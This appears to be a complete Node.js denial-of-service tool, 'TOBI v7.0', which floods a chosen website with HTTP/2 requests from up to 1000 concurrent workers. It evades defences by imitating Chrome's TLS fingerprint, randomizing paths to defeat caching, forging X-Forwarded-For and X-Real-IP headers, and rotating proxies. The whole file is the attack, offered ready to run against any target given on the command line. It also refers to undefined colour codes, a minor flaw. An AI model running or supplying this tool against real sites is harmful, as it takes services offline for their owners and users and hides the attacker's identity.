#!/usr/bin/env node

/**
 * TOBI v7.0 – HTTP/2 + TLS Fingerprint
 * Fixed: always adds https:// to target
 */

const tls = require('tls');
const http2 = require('http2');
const crypto = require('crypto');
const fs = require('fs');

// ==================== COLORS ====================
const c = {
    red: '\x1b[91m', green: '\x1b[92m', yellow: '\x1b[93m',
    cyan: '\x1b[96m', bold: '\x1b[1m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
};

// ==================== GET ARGUMENTS ====================
let rawTarget = process.argv[2];
let duration = parseInt(process.argv[3]) || 60;
let workers = parseInt(process.argv[4]) || 1000;
let proxyFile = process.argv[5] || null;

// 🔥 FIX: ensure target has https://
if (!rawTarget) {
    console.log(`${c.red}Usage: node Tobi.js <target> [duration] [workers] [proxy.txt]${c.reset}`);
    process.exit(1);
}
let target = rawTarget.includes('://') ? rawTarget : 'https://' + rawTarget;

// ==================== PROXY MANAGER ====================
let proxies = [];
let proxyIndex = 0;

function loadProxies() {
    if (!proxyFile) return;
    try {
        const content = fs.readFileSync(proxyFile, 'utf8');
        proxies = content.split('\n').filter(l => l.trim() && !l.startsWith('#') && l.includes(':'));
        console.log(`${c.green}[✓] Loaded ${proxies.length} proxies${c.reset}`);
    } catch(e) {
        console.log(`${c.yellow}[!] No proxy file – running without proxies${c.reset}`);
    }
}

function getProxy() {
    if (proxies.length === 0) return null;
    proxyIndex = (proxyIndex + 1) % proxies.length;
    return proxies[proxyIndex];
}

// ==================== TLS FINGERPRINT (Chrome 121) ====================
const tlsOptions = {
    ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
    ecdhCurve: 'X25519',
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    honorCipherOrder: true,
    rejectUnauthorized: false,
    ALPNProtocols: ['h2', 'http/1.1']
};

function randomString(len) { return crypto.randomBytes(len).toString('hex'); }
function spoofIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)}`; }

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
];

function generateHeaders(host) {
    return {
        ':method': 'GET',
        ':path': `/${randomString(8)}?t=${Date.now()}&r=${randomString(6)}`,
        ':scheme': 'https',
        ':authority': host,
        'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': 'no-cache',
        'x-forwarded-for': spoofIP(),
        'x-real-ip': spoofIP(),
        'referer': 'https://www.google.com/'
    };
}

// ==================== HTTP/2 ATTACK ====================
function attack(callback) {
    const parsed = new URL(target);  // now target always has https://
    const proxy = getProxy();
    let socket;
    if (proxy) {
        const net = require('net');
        const [host, port] = proxy.split(':');
        socket = net.connect(parseInt(port), host, () => {
            const tlsSocket = tls.connect({
                host: parsed.hostname,
                port: 443,
                socket: socket,
                ...tlsOptions,
                servername: parsed.hostname
            }, () => {
                const session = http2.connect(parsed.hostname, { createConnection: () => tlsSocket, ...tlsOptions });
                session.on('error', () => callback(false));
                const req = session.request(generateHeaders(parsed.hostname));
                req.on('response', (headers) => {
                    const status = headers[':status'];
                    req.on('data', () => {});
                    req.on('end', () => {
                        session.close();
                        callback(status >= 200 && status < 400);
                    });
                });
                req.on('error', () => {
                    session.close();
                    callback(false);
                });
                req.end();
            });
            tlsSocket.on('error', () => callback(false));
        });
        socket.on('error', () => callback(false));
    } else {
        const session = http2.connect(parsed.hostname, tlsOptions);
        session.on('error', () => callback(false));
        const req = session.request(generateHeaders(parsed.hostname));
        req.on('response', (headers) => {
            const status = headers[':status'];
            req.on('data', () => {});
            req.on('end', () => {
                session.close();
                callback(status >= 200 && status < 400);
            });
        });
        req.on('error', () => {
            session.close();
            callback(false);
        });
        req.end();
    }
}

// ==================== STATISTICS ====================
let stats = { total: 0, success: 0, failed: 0, startTime: Date.now(), lastSec: Date.now()/1000, lastSecCount: 0, peakRps: 0 };
let stop = false;

function displayStats() {
    const elapsed = (Date.now() - stats.startTime) / 1000;
    const rps = stats.total / Math.max(elapsed, 0.1);
    const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
    process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${rps.toFixed(1)}${c.reset} | ` +
        `${c.green}✓ ${stats.success.toLocaleString()}${c.reset} | ` +
        `${c.red}✗ ${stats.failed.toLocaleString()}${c.reset} | ` +
        `${c.yellow}${successRate.toFixed(1)}%${c.reset} | ` +
        `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
}

function worker() {
    if (stop) return;
    attack((success) => {
        stats.total++;
        if (success) stats.success++;
        else stats.failed++;
        const nowSec = Date.now() / 1000;
        if (nowSec - stats.lastSec >= 1) {
            if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
            stats.lastSecCount = 0;
            stats.lastSec = nowSec;
        }
        stats.lastSecCount++;
        worker();
    });
}

// ==================== MAIN ====================
console.log(c.clear);
console.log(`${c.red}${c.bold}
╔══════════════════════════════════════════════════════════════════════════╗
║                         🔥 TOBI v7.0 – HTTP/2 🔥                         ║
║                TLS Fingerprint | Proxy Rotation | Instant                ║
╚══════════════════════════════════════════════════════════════════════════╝${c.reset}`);
console.log(`\n${c.green}[✓] Target: ${target}`);
console.log(`[✓] Duration: ${duration}s`);
console.log(`[✓] Workers: ${workers.toLocaleString()}`);
if (proxyFile) loadProxies();
console.log(`${c.reset}\n`);

stats.startTime = Date.now();
stats.lastSec = stats.startTime / 1000;

console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
for (let i = 0; i < workers; i++) worker();
console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);

const interval = setInterval(displayStats, 1000);

setTimeout(() => { stop = true; }, duration * 1000);
process.on('SIGINT', () => {
    console.log(`\n${c.yellow}[!] Shutting down...${c.reset}`);
    stop = true;
    setTimeout(() => {
        clearInterval(interval);
        const elapsed = (Date.now() - stats.startTime) / 1000;
        const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
        console.log(`\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════`);
        console.log(`                    FINAL REPORT`);
        console.log(`════════════════════════════════════════════════════════════════${c.reset}`);
        console.log(`  Total Requests:  ${stats.total.toLocaleString()}`);
        console.log(`  Successful:      ${stats.success.toLocaleString()}`);
        console.log(`  Failed:          ${stats.failed.toLocaleString()}`);
        console.log(`  Success Rate:    ${successRate.toFixed(2)}%`);
        console.log(`  Peak RPS:        ${stats.peakRps}`);
        console.log(`  Duration:        ${elapsed.toFixed(1)}s`);
        console.log(`${c.magenta}════════════════════════════════════════════════════════════════${c.reset}`);
        process.exit(0);
    }, 500);
});
